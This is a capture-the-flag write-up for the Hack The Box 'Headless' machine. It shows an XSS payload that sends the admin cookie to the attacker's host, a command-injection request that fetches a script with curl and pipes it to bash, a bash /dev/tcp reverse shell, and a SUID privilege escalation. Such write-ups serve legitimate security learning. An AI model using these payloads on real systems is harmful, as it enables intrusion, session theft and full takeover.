# Headless

#htb #xss #easy #nmap #privesc #rce

>David-Andrei Popa (contact@popadavid.ro)

# Solution

## User

Firstly, we scan the given IP using nmap.

```bash
nmap -sV -Pn 10.10.11.8
```

From the output of nmap, we can see that there are 2 services that are currently running on the machine.

```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 13:16 EDT
Nmap scan report for 10.10.11.8
Host is up (0.052s latency).
Not shown: 983 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        VERSION
7/tcp     filtered echo
22/tcp    open     ssh            OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
1052/tcp  filtered ddt
1062/tcp  filtered veracity
1434/tcp  filtered ms-sql-m
3006/tcp  filtered deslogind
3260/tcp  filtered iscsi
3261/tcp  filtered winshadow
3371/tcp  filtered satvid-datalnk
5000/tcp  open     upnp?
5405/tcp  filtered pcduo
5718/tcp  filtered dpm
7921/tcp  filtered unknown
9000/tcp  filtered cslistener
9575/tcp  filtered unknown
9929/tcp  filtered nping-echo
50002/tcp filtered iiimsf
```

By navigating to `http://10.10.11.8:5000`, we can see that the website loads a cookie `is_admin`, which seems to check whether or not the user could access `/dashboard` (obtained from gobuster).

After going to `/support` and testing basic payloads, we observe that the webserver checks for XSS. We can bypass those checks by injecting the XSS payload in the User-Agent header.

Before injecting the payload, we start up a python webserver to get the admin cookie.

```bash
python -m http.server 9000
```

After starting the python webserver, we inject the XSS payload into the User-Agent. You can find more payloads and information [here](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting).

```js
<img src=x onerror=fetch("http://10.10.14.230:9000"+document.cookie);>
```

We obtain the admin cookie in the request logs of the python webserver.

Now we can access `/dashboard` successfully.

By analyzing the `POST` request that is being sent from `/dashboard`, we can see the `date` field in the body, which is vulnerable to command injection.

Using a classic remote shell payload, we can start up a remote connection to the machine using a bash shell.

```bash
#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.230/4000 0>&1'
```

We start up our netcat listener on port 4000 and using our python webserver we download the shell on the machine.

```HTTP
Request body

date=;curl "http://10.10.14.230:4000/shell.sh"|bash
```

Upon getting a reverse shell, we can use `pwd` to localize the current working directory. Thus, by navigating to the user's folder, we get the `user.txt` file.

## Root

At this point we could upgrade our shell if we want to. I decided to leave it as it is and proceed to the next goal.

By running `sudo -l`, we find out that our user can run the `/usr/bin/syscheck` binary with root privileges.

Upon inspecting the `/usr/bin/syscheck` binary, we see that it looks for a specific file in the local working directory named `initdb.sh`.

By creating the `initdb.sh` file in the local working directory, we can modify the permissions of `/bin/bash`.

```bash
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x ./initdb.sh
```

Now if we try to run `sudo /usr/bin/syscheck`, our file will be executed, thus changing the permissions of `/bin/bash`. Unlocking the root shell, we can execute `/bin/bash -p` and gain root privileges.

By navigating to `/root`, we can obtain the `root.txt` file.
